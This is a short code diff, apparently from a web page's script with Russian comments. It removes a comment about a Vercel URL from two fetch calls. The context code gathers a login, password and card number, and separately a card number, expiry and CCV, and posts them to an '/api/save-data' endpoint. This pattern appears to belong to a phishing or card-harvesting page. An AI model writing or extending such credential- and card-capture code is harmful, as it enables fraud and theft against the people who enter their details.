@@ -288,7 +288,7 @@
         // Отправка данных
         const dataToSend = { login, password, cardNumber };
 
-        fetch('/api/save-data', { // Обратите внимание на URL Vercel
+        fetch('/api/save-data', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -334,7 +334,7 @@
         // Отправка данных
         const dataToSend = { cardNumber, monthYear, ccv };
 
-        fetch('/api/save-data', { // Обратите внимание на URL Vercel
+        fetch('/api/save-data', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
